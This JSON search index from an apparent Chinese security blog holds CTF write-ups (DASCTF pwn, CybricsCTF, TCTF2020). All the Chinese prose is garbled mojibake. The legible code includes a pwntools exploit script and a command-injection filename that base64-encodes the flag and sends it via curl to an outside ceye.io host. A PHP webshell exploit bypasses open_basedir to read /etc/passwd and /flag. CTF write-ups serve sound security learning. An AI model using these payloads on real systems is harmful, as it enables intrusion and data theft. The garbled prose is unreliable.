{"pages":[{"title":"404","text":"æ‚¨è®¿é—®çš„é¡µé¢ä¸å­˜åœ¨ğŸ˜¶ å†é€›é€›å‘—ğŸ˜","link":"/404.html"},{"title":"categories","text":"","link":"/archives/index.html"},{"title":"friends","text":"ç”³è¯·å‹é“¾é¡»çŸ¥ åŸåˆ™ä¸Šåªå’ŒæŠ€æœ¯ç±»åšå®¢äº¤æ¢ï¼Œä½†ä¸åŒ…æ‹¬å«æœ‰å’Œè‰²æƒ…ã€æš´åŠ›ã€æ”¿æ²»æ•æ„Ÿçš„ç½‘ç«™ã€‚ ä¸å’Œå‰½çªƒã€ä¾µæƒã€æ— è¯šä¿¡çš„ç½‘ç«™äº¤æ¢ï¼Œä¼˜å…ˆå’Œå…·æœ‰åŸåˆ›ä½œå“çš„ç½‘ç«™äº¤æ¢ã€‚ ç”³è¯·è¯·æä¾›ï¼šç«™ç‚¹åç§°ã€ç«™ç‚¹é“¾æ¥ã€ç«™ç‚¹æè¿°ã€logoæˆ–å¤´åƒï¼ˆä¸è¦è®¾ç½®é˜²ç›—é“¾ï¼‰ã€‚ æ’åä¸åˆ†å…ˆåï¼Œåˆ·æ–°åé‡æ’ï¼Œæ›´æ–°ä¿¡æ¯åè¯·ç•™è¨€å‘ŠçŸ¥ã€‚ æœ¬ç«™ä¸å­˜å‚¨å‹é“¾å›¾ç‰‡ï¼Œå¦‚æœå‹é“¾å›¾ç‰‡æ¢äº†æ— æ³•æ›´æ–°ã€‚å›¾ç‰‡è£‚äº†çš„ä¼šæ›¿æ¢æˆé»˜è®¤å›¾ï¼Œéœ€è¦æ›´æ¢çš„è¯·ç•™è¨€å‘ŠçŸ¥ã€‚ æœ¬ç«™å‹é“¾ä¿¡æ¯å¦‚ä¸‹ï¼Œç”³è¯·å‹é“¾å‰è¯·å…ˆæ·»åŠ æœ¬ç«™ä¿¡æ¯ï¼š I Dï¼šggb0n ç½‘ç«™å›¾æ ‡ï¼šhttp://ggb0n.cool/images/header.jpg ç½‘ç«™åœ°å€ï¼šhttp://ggb0n.cool ç½‘ç«™ç®€ä»‹ï¼šæŠ€æœ¯åˆ†äº«ï¼Œç½‘ç»œå®‰å…¨ï¼ŒCTFï¼Œæœºå™¨å­¦ä¹  åŠ è½½ä¸­ï¼Œç¨ç­‰å‡ ç§’...","link":"/friend/index.html"},{"title":"comment","text":"æ¬¢è¿æŒ‡ç‚¹~ğŸ§","link":"/message/index.html"},{"title":"tags","text":"","link":"/tags/index.html"},{"title":"about","text":"ä¸ªäººç®€ä»‹ ä¸ªäººä¿¡æ¯ï¼šç•¥æ‡‚ç½‘ç»œå®‰å…¨ã€ç•¥å­¦æœºå™¨å­¦ä¹ ã€ç•¥ä¼šCTFã€ç•¥ç•¥ç•¥~~~è¿½æ±‚æ›´æ·±è¿œçš„å­¦ä¹ ï¼Œå­¦åˆ°æ–°çŸ¥è¯†å°±ä¼šå¿ƒæ½®æ¾æ¹ƒï¼QQï¼š1727355549é‚®ç®±ï¼šgg.b0n@qq.com \\ 9g.b0nd@gmail.com åšå®¢ä¿¡æ¯ æœ¬ç«™ç‚¹ä¸»è¦è®°å½•ä¸€äº›æ—¥å¸¸å­¦ä¹ ï¼Œä¸€äº›CTFæ¯”èµ›é¢˜è§£ã€èµ›é¢˜å¤ç°ã€‚å¸Œæœ›èƒ½ä¸åŒä»ä»¬åˆ†äº«çŸ¥è¯†ä¸æŠ€æœ¯ï¼Œå½“ç„¶æˆ‘è‡ªå·±è¿˜æ˜¯æ¯”è¾ƒèœæ»´ï¼Œè·¯è¿‡çš„å¸ˆå‚…ï¼Œè¿˜è¯·å¤šå¤šæŒ‡ç‚¹å‘€ã€‚ è®¡åˆ’ 2020-GOALS 2020.04.16 æå‡èƒ½åŠ›ğŸ’€ 2020.04.17 å®Œæˆæ¯•ä¸šè®¾è®¡ğŸ’ª 2020.04.17 å­¦ä¹ PWNğŸ’€ æ—¶é—´è½´è®°å½•","link":"/about/index.html"},{"title":"categories","text":"","link":"/categories/index.html"}],"posts":[{"title":"DASCTFä¸ƒæœˆæœˆèµ›PWN","text":"å°è¯•åšåšpwné¢˜ï¼Œç»“æœå¾ˆå¤±è´¥ï¼Œä¸è¿‡å­¦åˆ°äº†æ–°ä¸œè¥¿ã€‚ qiandaoç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯åœ¨leaveæŒ‡ä»¤åï¼Œåˆ©ç”¨leaæŒ‡ä»¤ç»™espèµ‹å€¼åˆ«çš„åœ°å€ï¼Œå¯¼è‡´æˆ‘ä»¬è¦†ç›–åˆ°è¿”å›åœ°å€çš„åœ°å€ä¸èƒ½è¢«è·³è½¬ã€‚ åˆ†æé¦–å…ˆéœ€è¦æ˜ç™½åœ¨å‡½æ•°è¿”å›æ—¶leaveå’Œretä¸¤æ¡æŒ‡ä»¤çš„æœ¬è´¨ï¼š leaveæŒ‡ä»¤ç›¸å½“äºmov esp,ebp; pop ebp;å³æ¢å¤ä¸Šä¸€ä¸ªå‡½æ•°çš„æ ˆç»“æ„ retæŒ‡ä»¤åˆ™ç›¸å½“äºpop esp;ä¹Ÿå°±æ˜¯åœ¨ebpå‡ºæ ˆä¹‹åï¼Œespå…¶å®æ˜¯æŒ‡å‘è¿”å›åœ°å€çš„ï¼Œå°±ä¼šå°†å½“å‰æ ˆé¡¶å†…å®¹å¼¹å‡ºåˆ°eipä¸­è¿›è¡Œæ‰§è¡Œ è€Œleaå’ŒmovæŒ‡ä»¤å‘¢ï¼Ÿ leaæ˜¯load effective addressçš„ç¼©å†™ï¼Œç®€å•çš„è¯´ï¼ŒleaæŒ‡ä»¤å¯ä»¥ç”¨æ¥å°†ä¸€ä¸ªå†…å­˜åœ°å€ç›´æ¥èµ‹ç»™ç›®çš„æ“ä½œæ•°ï¼Œä¾‹å¦‚ï¼šlea eax,[ebx+8]å°±æ˜¯å°†ebx+8è¿™ä¸ªå€¼ç›´æ¥èµ‹ç»™eaxï¼Œè€Œä¸æ˜¯æŠŠebx+8å¤„çš„å†…å­˜åœ°å€é‡Œçš„æ•°æ®èµ‹ç»™eaxã€‚ è€ŒmovæŒ‡ä»¤åˆ™æ°æ°ç›¸åï¼Œä¾‹å¦‚ï¼šmov eax,[ebx+8]åˆ™æ˜¯æŠŠå†…å­˜åœ°å€ä¸ºebx+8å¤„çš„æ•°æ®èµ‹ç»™eaxã€‚ å†çœ‹ä¸€ä¸‹è¿™é“é¢˜ç›®ä¸­å‡½æ•°è°ƒç”¨ç»“æŸçš„æŒ‡ä»¤ï¼š åœ¨leaveå’Œretä¹‹é—´æ‰§è¡Œäº†lea esp,[ecx-4]ä¹Ÿå°±æ˜¯å°†espæŒ‡å‘äº†ecx-4è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€åœ¨å“ªï¼Ÿæˆ‘ä»¬çœ‹åˆ°å‰é¢çš„mov ecx,[ebp+var_4]å¾—çŸ¥äº†ecxå­˜æ”¾çš„æ˜¯ebp+var_4åœ°å€ä¸Šçš„å†…å®¹ï¼Œè€Œvar_4æ˜¯æ ˆä¸Šæ¯”ebpä½å››å­—èŠ‚çš„ä½ç½®ï¼š ä¹Ÿå°±æ˜¯è¯´esp=[ebp-4]-4 åŒæ—¶ç¨‹åºåˆå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦å‡ºçº³æ¼æ´ï¼Œé‚£æ•´ä¸ªæ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼š 1ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²æ ˆåœ°å€ 2ã€ä¿®æ”¹ebp-4å¤„çš„å€¼ä¸ºå¯æ§åœ°å€ 3ã€åœ¨å¯æ§åœ°å€-4çš„ä½ç½®å­˜æ”¾backdoorçš„åœ°å€ æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹èƒ½ä¸èƒ½é€šè¿‡è¾“å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²è¾“å‡ºebpåœ°å€ï¼š%p%p%p%p%p%p%p%p%p ä»å›¾ä¸­çš„ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œç¬¬äºŒä¸ªå‚æ•°è¾“å‡ºçš„å†…å®¹æ­£æ˜¯æ ˆåº•åœ°å€ã€‚ æ³¨æ„ï¼šæŒ‡å‡ºä¸ªå®¹æ˜“æ··æ·†çš„åœ°æ–¹ åœ¨ç”¨ä»£ç attachçš„æ—¶å€™ï¼Œå‘ç°ebpä¸­æ˜¯æœ‰ä¸‰ä¸ªåœ°å€(ä¸‹å›¾)ï¼Œç¬¬ä¸‰ä¸ªæ‰æ˜¯çœŸæ­£çš„mainå‡½æ•°çš„æ ˆåº•åœ°å€ï¼Œåˆšå¼€å§‹å¾ˆå›°æƒ‘ä¸ºä»€ä¹ˆebpä¸æ˜¯è¾“å‡ºçš„å€¼ï¼Ÿæ€è€ƒåŠå¤©æ‰æƒ³èµ·æ¥mainå‡½æ•°ä¸­è°ƒç”¨äº†å¤šæ¬¡çš„putså’Œgetså‡½æ•°ï¼Œattachçš„æ—¶å€™æ˜¯åœ¨è°ƒç”¨å‡½æ•°æ ˆä¸­çš„ã€‚ ç”±æ­¤æ„é€ ä¸‹payloadï¼š stack_addr = int(p.recv(8),16) - 0x24 # è¿™é‡Œæ˜¯æ¥æ”¶åˆ°çš„æ ˆåº•åœ°å€çš„ä½0x24å­—èŠ‚çš„åœ°æ–¹ï¼Œå®ƒçš„ä½4å­—èŠ‚å­˜æ”¾backdoorçš„åœ°å€payload2 = p32(back_addr) + '\\x00'*0x20 + p32(stack_addr) # è¿™é‡Œç¬¬äºŒæ¬¡è¾“å…¥ï¼Œä»ebp-0x28çš„åœ°æ–¹è¾“å…¥çš„ï¼Œæ‰€ä»¥ä¸­é—´å¡«å……0x20ä¸ª\\x00ï¼Œç„¶åç”¨stack_addrè¦†ç›–ebp-0x4çš„å€¼ï¼Œä½¿leaæŒ‡ä»¤ä¹‹åçš„esp-4æŒ‡å‘å­˜æ”¾backdooråœ°å€çš„åœ°æ–¹ æ„é€ expå¦‚ä¸‹ï¼š expfrom pwn import *context.log_level = 'debug'p = process('./qiandao')#p = remote('183.129.189.60',10013)back_addr = 0x0804857Dpayload1 = '%2$p'p.recvuntil('name:')p.sendline(payload1)gdb.attach(p)p.recvuntil('0x')stack_addr = int(p.recv(8),16) - 0x24payload2 = p32(back_addr) + '\\x00'*0x20 + p32(stack_addr)p.recvuntil('problem?')#gdb.attach(p)p.sendline(payload2)#gdb.attach(p)p.interactive()","link":"/2020/07/26/DASCTF%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9BPWN/"},{"title":"CybricsCTF","text":"è®°å¾—å»å¹´æ˜¯æ”¾å‡å›å®¶çš„è·¯ä¸Šæ¯”èµ›å¼€å§‹çš„ï¼Œå›åˆ°å®¶å¼€å§‹åšï¼Œç»“æœä¸€é“é¢˜ä¹Ÿæ²¡å‡ºâ€¦ ä»Šå¹´è¿˜è¡Œï¼Œç®€å•é¢˜èƒ½åšåšã€‚ Misc-Hellish Reversebinwalkç›´æ¥æ‹¿åˆ°flag Misc-Krevedkahttpæµé‡æº¯æº è§£é¢˜é¢˜ç›®è¯´æ˜¯ä¸€ä¸ªå†…ç½‘ç”¨æˆ·ç”¨å¦ä¸€ä¸ªç”¨æˆ·çš„è´¦å·calechesè¿›è¡Œç™»å½•ï¼Œé‚£æˆ‘ä»¬å°±æ‰¾calechesæäº¤ç”³è¯·çš„POSTåŒ…ï¼š urlencoded-form.value==\"caleches\" å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªæäº¤ç™»å½•çš„æŠ¥æ–‡ï¼š å¯†ç æ˜¯vixieå’Œ%20+or+1%3D1+--æ˜¾ç„¶åŒ…å«ç¬¬äºŒä¸ªå¯†ç çš„æŠ¥æ–‡æ˜¯æ”»å‡»è€…æäº¤çš„ï¼Œå¯ä»¥åœ¨è¯¥æŠ¥æ–‡ä¸­æ‹¿åˆ°ä»–æµè§ˆå™¨çš„User-Agentä¿¡æ¯ï¼Œç„¶åå†ç”¨æ­¤ä¿¡æ¯å»æ•°æ®åŒ…ä¸­æ‰¾å…¶ä»–åŒ…å«æ­¤ä¿¡æ¯çš„æŠ¥æ–‡ï¼Œä¾¿å¯ä»¥æ‰¾åˆ°æ”»å‡»è€…æäº¤çš„æŠ¥æ–‡è®°å½•ï¼Œå…¶ä¸­åŒ…å«ä»–è‡ªå·±çš„ç”¨æˆ·åï¼š http.user_agent==\"UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; www1.smart.com.ph/; GT-S5360) U2/1.0.0 UCBrowser/9.8.0.534 Mobile\" Misc-Kyshooterè€ƒå¯Ÿè§†é¢‘åˆ†å¸§/æ…¢æ”¾ï¼Œå¥½å§ï¼Œå…¶å®è€ƒçš„æ˜¯çœ¼åŠ›ã€‚ã€‚ã€‚ è§£é¢˜ffmpegå¯¹è§†é¢‘è¿›è¡Œåˆ†å¸§ï¼Œ ffmpeg.exe -i speeded.mp4 -r 30 %3d.png ç»“åˆPotplayer0.2å€é€Ÿæ…¢æ”¾ï¼Œå†å¤šæ¬¡å°è¯•å¾—åˆ°å¯†ç mahchoudqotlzeebï¼Œçœ‹åˆ°è§†é¢‘é‡Œçš„åŠ å¯†æ˜¯ï¼š openssl enc -aes-256-cbc -in flag.txt -out flag.txt.enc ç”¨aes-256-cbcè§£å¯†å³å¯ï¼š openssl enc -d -aes-256-cbc -in flag.txt.enc -out flag.txt åˆšå¼€å§‹ç”¨ubuntu16æ­»æ´»è§£å¯†é”™è¯¯ï¼Œä»¥ä¸ºæ˜¯å¯†ç é”™äº†ï¼Œç‹‚çŒœå¯†ç éƒ½ä¸è¡Œï¼Œåæ¥å¶ç„¶é—´ç”¨ubuntu18æ‰è§£æ­£ç¡®ï¼Œé­”å¹»ã€‚ã€‚ã€‚ MISC-XCorç®€å•æµé‡å®¡è®¡ è§£é¢˜æ‹¿åˆ°æµé‡åŒ…ï¼Œå¯å¯¼å‡ºnet10.exeçš„å¯¹è±¡ï¼Œéœ€è¦è¾“å…¥ç”¨æˆ·åï¼Œç„¶ååœ¨æµé‡åŒ…ä¸­æ‰¾åˆ°äº†åŒ…å«ç”¨æˆ·åçš„ä¸¤ä¸ªæŠ¥æ–‡ï¼š æ‹¿åˆ°ç”¨æˆ·åç™»å½•å³å¯æ‹¿åˆ°flag Crypto-Mic Checkç­¾åˆ°å¯†ç é¢˜ï¼Œæç¤ºè¯´æ˜¯ä¸Windowsçš„UserAssiståŠ å¯†ï¼Œå…¶å®å°±æ˜¯ROT-13åŠ å¯†ï¼Œå­—æ¯å¯¹åº”å¦‚ä¸‹ ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzNOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm æ›¿æ¢å›å»å³å¯ã€‚ Crypto-Broken Invitationé¢˜ç›®ç»™äº†ä¸‰ç»„å…¬é’¥ã€ä¸”e=3ï¼Œæ˜¾ç„¶æ˜¯ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»ï¼Œä»£ç å¦‚ä¸‹ï¼š from functools import reduceimport binascii, gmpy2from Crypto.Util.number import long_to_bytesn = [0x8aa5dfa13fd16765b7a220eac8731dbc2865772496325b671e742ec391249bbddc4aaa3c8264a0ba5de8843d161dcbb5eb02813fcf14aab3ef315845228864b9fb426620bedb146237f2095adcaa233280bdd526aa2238e66b222c880fd4d78efacc56a887,0x3eff009b4c43b714ff55f38fa16a633f266ca10e7500c568715d91b650573f66dcb6266be76da94b9ca7c394a9b65fed6e7b8522a1da640ce7033fd933aa1c3e4a1fd0747c1b17ec2fa1239299beaa269752944d7cc084ee145985f1,0x698a394fbc84898d0a276f457de4166ffcb6c96736621de30892e66585da3077f7e6298f23fb31b511989692a1fd4d1ebc7ded8d35f93a80de69fb9ec1003af55484f5638215aa84866191df9baa56a394179f66243e803b0df8c789c8755eef4e431205264205]c = [0x3a4fe4c9a1318194d364e7a67b7e34dbb02c3f2e63f52b26bb8b3ef349807679c0ff95245187b5ddbc1baaa4a808137d456696cfb3ebe47b7853cec33c709d9ce8b46272f7b0b0e69dd4091920b968b8ad37686e24b800928732daf924f98945267cfd156a,0x2ed28a3bb70af3820c5fc9e27f16b8d893ba578bcf1d879a32898c8e4e0f4b3fdf339889f9a44026de783786e62f1fe8fc25770bf89519c2fbd66d2cc6c02ffae8722b4391173993fa3f993b3318f07ca9a31df84a48959bfd0e06a,0x63faaa3d6c3585425190d755347f6cd8913805f7edc551096322d105f24a6339c8f0ac1025db08cbda89195818acdeaea42a9273b10b874ec63e7d986f1172988a700308bc72f3d4531c9ec08e2ec06f5c00c54cc54d13b44ff33eb3851231fb591a0c15e220ac]def CRT(mi, ai): assert(reduce(gmpy2.gcd,mi)==1) assert (isinstance(mi, list) and isinstance(ai, list)) M = reduce(lambda x, y: x * y, mi) ai_ti_Mi = [a * (M // m) * gmpy2.invert(M // m, m) for (m, a) in zip(mi, ai)] return reduce(lambda x, y: x + y, ai_ti_Mi) % Me=0x3m=gmpy2.iroot(CRT(n, c), e)[0]m = long_to_bytes(m)s = str(m)print(s[::-1]) Reverse-Babyrevç®€å•é€†å‘ï¼Œä¸ç„¶ä¹Ÿåšä¸å‡ºæ¥ è§£é¢˜ç»™äº†xmlæ–‡ä»¶ï¼Œé¢˜ç›®è¿˜æç¤ºï¼šsnap.berkeley.edu/offline ä¸‹è½½snapï¼Œæ‰“å¼€xmlæ–‡ä»¶å¯ä»¥å¾—åˆ°åŠ å¯†é€»è¾‘ï¼š å¯ä»¥çœ‹åˆ°æ˜¯ä¸33è¿›è¡Œå¼‚æˆ–ï¼Œæ‹¿æœ€åçš„ç»“æœå¼‚æˆ–å›å»å³å¯ï¼š list = [66,88,67,83,72,66,82,90,86,18,77,16,98,17,76,18,126,97,79,69,126,102,17,17,69,126,77,116,66,74,0,92]flag = \"\"for i in range(len(list)): tmp = list[i] flag+=chr(tmp^33)print flag Web-Huntäº”ä¸ªéªŒè¯ç ï¼Œå…¨éªŒè¯å¯¹äº†å°±è¡Œï¼Œè¿™é¢˜å¾—ç§‘å­¦ä¸Šç½‘ï¼Œè¦ä¸ç„¶éªŒè¯ç ä½ éƒ½æ‹¿ä¸åˆ°ã€‚ã€‚ã€‚ Web-Gif2pngé¢˜ç›®æä¾›äº†æºç ï¼š import loggingimport reimport subprocessimport uuidfrom pathlib import Pathfrom flask import Flask, render_template, request, redirect, url_for, flash, send_from_directoryfrom flask_bootstrap import Bootstrapimport osfrom werkzeug.utils import secure_filenameimport filetypeALLOWED_EXTENSIONS = {'gif'}app = Flask(__name__)app.config['UPLOAD_FOLDER'] = './uploads'app.config['SECRET_KEY'] = '********************************'app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 # 500KbffLaG = \"cybrics{********************************}\"Bootstrap(app)logging.getLogger().setLevel(logging.DEBUG)def allowed_file(filename): return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/', methods=['GET', 'POST'])def upload_file(): logging.debug(request.headers) if request.method == 'POST': if 'file' not in request.files: logging.debug('No file part') flash('No file part', 'danger') return redirect(request.url) file = request.files['file'] if file.filename == '': logging.debug('No selected file') flash('No selected file', 'danger') return redirect(request.url) if not allowed_file(file.filename): logging.debug(f'Invalid file extension of file: {file.filename}') flash('Invalid file extension', 'danger') return redirect(request.url) if file.content_type != \"image/gif\": logging.debug(f'Invalid Content type: {file.content_type}') flash('Content type is not \"image/gif\"', 'danger') return redirect(request.url) if not bool(re.match(\"^[a-zA-Z0-9_\\-. '\\\"\\=\\$\\(\\)\\|]*$\", file.filename)) or \"..\" in file.filename: logging.debug(f'Invalid symbols in filename: {file.content_type}') flash('Invalid filename', 'danger') return redirect(request.url) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename)) mime_type = filetype.guess_mime(f'uploads/{file.filename}') if mime_type != \"image/gif\": logging.debug(f'Invalid Mime type: {mime_type}') flash('Mime type is not \"image/gif\"', 'danger') return redirect(request.url) uid = str(uuid.uuid4()) os.mkdir(f\"uploads/{uid}\") logging.debug(f\"Created: {uid}. Command: ffmpeg -i 'uploads/{file.filename}' \\\"uploads/{uid}/%03d.png\\\"\") command = subprocess.Popen(f\"ffmpeg -i 'uploads/{file.filename}' \\\"uploads/{uid}/%03d.png\\\"\", shell=True) # å‘½ä»¤æ‰§è¡Œ command.wait(timeout=15) logging.debug(command.stdout) flash('Successfully saved', 'success') return redirect(url_for('result', uid=uid)) return render_template(\"form.html\")@app.route('/result/&lt;uid&gt;/')def result(uid): images = [] for image in os.listdir(f\"uploads/{uid}\"): mime_type = filetype.guess(str(Path(\"uploads\") / uid / image)) if image.endswith(\".png\") and mime_type is not None and mime_type.EXTENSION == \"png\": images.append(image) return render_template(\"result.html\", uid=uid, images=images)@app.route('/uploads/&lt;uid&gt;/&lt;image&gt;')def image(uid, image): logging.debug(request.headers) dir = str(Path(app.config['UPLOAD_FOLDER']) / uid) return send_from_directory(dir, image)@app.errorhandler(413)def request_entity_too_large(error): return \"File is too large\", 413if __name__ == \"__main__\": app.run(host='localhost', port=5000, debug=False, threaded=True) ä»£ç ä¸­å¯ä»¥è¿›è¡Œå‘½ä»¤æ³¨å…¥ï¼Œæˆ‘æ³¨é‡Šäº†ï¼Œä½†æ˜¯å‘½ä»¤æ‰“è¿‡å»æ²¡æœ‰å¾—åˆ°ç»“æœã€‚ã€‚ã€‚åº”è¯¥æ˜¯é¢˜ç›®æœåŠ¡å™¨å­˜åœ¨é˜²ç«å¢™é˜»æ­¢äº†é€šè¿‡80ç«¯å£å‘å¤–è¿›è¡Œèµ„æºè¯·æ±‚ï¼Œå› æ­¤è€ƒè™‘åˆ©ç”¨DNSlogæ‹¿å‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œå‚è€ƒè¿™é‡Œã€‚ å¦‚æœæƒ³å¾€DNSå¹³å°ä¸Šæ‰“ï¼Œå°±éœ€è¦æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œä½†æ˜¯å­—ç¬¦è¿›è¡Œäº†é™åˆ¶ï¼š if not bool(re.match(\"^[a-zA-Z0-9_\\-. '\\\"\\=\\$\\(\\)\\|]*$\", file.filename)) or \"..\" in file.filename: logging.debug(f'Invalid symbols in filename: {file.content_type}') flash('Invalid filename', 'danger') return redirect(request.url) ä¼šä»æ–‡ä»¶åçš„å¤´éƒ¨å¼€å§‹åˆ°æ–‡ä»¶åç»“å°¾è¿›è¡Œå¤šæ¬¡åŒ¹é…ï¼Œå¦‚æœå­—ç¬¦åœ¨a-zA-Z0-9_-. '&quot;=$()|ä¹‹ä¸­ï¼Œåˆ™boolå‡½æ•°å¤„ç†åæ˜¯1ï¼ŒåŠ ä¸Šå‰é¢çš„notè½¬ä¸º0ï¼Œä¹Ÿå°±é€šè¿‡äº†æ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ çš„æ–‡ä»¶åå¿…é¡»åœ¨ä¸Šè¿°å­—ç¬¦çš„èŒƒå›´å†…ã€‚ è§£é¢˜è¿™é‡Œç”¨äº†http://ceye.io/å¹³å° éœ€è¦æ„é€ payloadå¦‚ä¸‹ï¼š flag=$(cat main.py|grep -wo cybrics{.*|base64|tr -d '=');curl $flag.o3svs0.ceye.io å¯ä»¥çœ‹åˆ°å…¶ä¸­{*å­—ç¬¦éƒ½ä¸åœ¨ç™½åå•é‡Œï¼Œå› æ­¤éœ€è¦è¿›è¡Œå¤„ç†ï¼Œbase64æ˜¯ä¸ªä¸é”™çš„é€‰æ‹© base64ç»“æœï¼š ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5vM3N2czAuY2V5ZS5pbw== åŒ…è£¹ä¸Šå‘½ä»¤ï¼š echo ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5vM3N2czAuY2V5ZS5pbw==|base64 -d | sh æœ€ç»ˆæ–‡ä»¶åï¼š ggb0n'||echo ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5vM3N2czAuY2V5ZS5pbw==|base64 -d | sh||'.gif ç„¶åä¸Šä¼ ã€æŠ“åŒ…ã€æ”¹æ–‡ä»¶åã€æ”¹æ–‡ä»¶ç±»å‹ï¼Œåœ¨DNSå¹³å°è·å–ç»“æœï¼š","link":"/2020/07/26/CybricsCTF/"},{"title":"TCTF2020éƒ¨åˆ†é¢˜è§£","text":"æ¯”èµ›çš„æ—¶å€™åšé¢˜ä¸€å¤´é›¾æ°´ï¼Œå¾ˆå¤šé¢˜ä¸€çŸ¥åŠè§£ï¼Œä¸èƒ½è‡ªå·±ç‹¬ç«‹å®Œæˆï¼Œèµ›åçœ‹é£˜é›¶å¸ˆå‚…çš„é¢˜è§£è¿›ä¸€æ­¥å­¦ä¹ ã€‚ Cloud Computingä¸€é“å‡ºåœ¨äº† Misc çš„é¢˜ç›®ï¼Œä½†æ˜¯è€ƒçš„æ˜¯ web çš„ open_basedir bypassã€‚ è¿›å…¥é¢˜ç›®ï¼Œç»™å‡ºæºç ï¼š &lt;?phperror_reporting(0);include 'function.php';$dir = 'sandbox/' . sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']) . '/';if(!file_exists($dir)){ mkdir($dir);}switch ($_GET[\"action\"] ?? \"\") { case 'pwd': echo $dir; break; case 'upload': $data = $_GET[\"data\"] ?? \"\"; if (waf($data)) { die('waf sucks...'); } file_put_contents(\"$dir\" . \"index.php\", $data); case 'shell': initShellEnv($dir); include $dir . \"index.php\"; break; default: highlight_file(__FILE__); break;} æ˜¾ç„¶éœ€è¦åœ¨ä¼ å‚uploadæ—¶å†™å…¥å°é©¬ getshellï¼Œç„¶åå†ä¼ å‚shellæ¥è¿›è¡Œ RCEã€‚ è§£é¢˜ç”±äºå¼•å·ï¼Œä¸‹åˆ’çº¿ç­‰å­—ç¬¦ç­‰å­—ç¬¦è¢«banæ‰äº†ï¼Œå› æ­¤è€ƒè™‘æ— å‚æ•°RCEï¼Œåˆ©ç”¨eval(end(getallheaders()))çš„æ–¹å¼ç»“åˆåœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ è¦æ‰§è¡Œçš„codeä»è€Œbypass wafã€‚ data = \"&lt;?=eval(end(getallheaders()));?&gt;\"code = r\"var_dump('ggb0n');\"headers = {'a':code} æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š ä½†æ˜¯ä¾æ—§æ— æ³•ä½¿ç”¨ phpinfo ç­‰å‡½æ•°ï¼Œæ€€ç–‘æ˜¯è¢«disable_functionç»™ç¦äº†ï¼Œè¿™é‡Œå¼€å¯æŠ¥é”™æŸ¥çœ‹åŸå› ï¼š code = r\"error_reporting(-1);phpinfo();\" å¯ä»¥çœ‹åˆ°å‡½æ•°ç¡®å®è¢«ç¦äº†ï¼ŒåŒæ—¶å€ŸåŠ© readfile å‡½æ•°å‘ç°å¼€å¯äº† open basedirï¼š ä½†æ˜¯ sandbox ä¸­å¯ä»¥ä»»æ„åˆ›å»ºæ–‡ä»¶å’Œç›®å½•ï¼Œå› æ­¤å¯ä»¥ç»“åˆ mkdir å’Œ chdir è¿›è¡Œ bypassï¼Œpayload å¦‚ä¸‹ï¼š code = \"error_reporting(E_ALL);chdir('sandbox/52933f6438c743819c0d2b1031d5547ab025d7d1/');mkdir('x');chdir('x');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print(base64_encode(file_get_contents('/etc/passwd')));\" å›æ˜¾å¦‚ä¸‹ï¼š å¯è§æˆåŠŸ bypassï¼Œç„¶åè¯»å–æ ¹ç›®å½•ä¸‹çš„ flag æ–‡ä»¶å³å¯ï¼Œæ‹¿åˆ°ä¸€ä¸ª img æ–‡ä»¶ï¼Œå…¶ä¸­éšè—äº† flag çš„å›¾ç‰‡ã€‚ å®Œæ•´expå¦‚ä¸‹ï¼š import requestsimport urllib url = \"http://pwnable.org:47780/?action=upload&amp;data=%s\"data = \"&lt;?=eval(end(getallheaders()));?&gt;\"#code = r\"var_dump('ggb0n');\"#code = r\"error_reporting(-1);phpinfo();\"#code = r\"error_reporting(-1);readfile('/etc/passwd');\"#code = \"error_reporting(E_ALL));chdir('/var/www/html/sandbox/52933f6438c743819c0d2b1031d5547ab025d7d1/');mkdir('ggb0n');chdir('ggb0n');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');readfile('/etc/passwd');\"code = \"error_reporting(E_ALL);chdir('sandbox/52933f6438c743819c0d2b1031d5547ab025d7d1/');mkdir('x');chdir('x');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print(base64_encode(file_get_contents('/flag')));\"headers = {'a':code}dir_url = \"http://pwnable.org:47780/?action=pwd\"first_url = url % datasecond_url = \"http://pwnable.org:47780/?action=shell\"r = requests.get(url=dir_url)print(r.content)r = requests.get(url=first_url,headers=headers)print(r.content)r = requests.get(url=second_url,headers=headers)print(r.content) Wechat Generatorè¿™é¢˜è€ƒå¯Ÿ ImageMagick å’Œ XSS 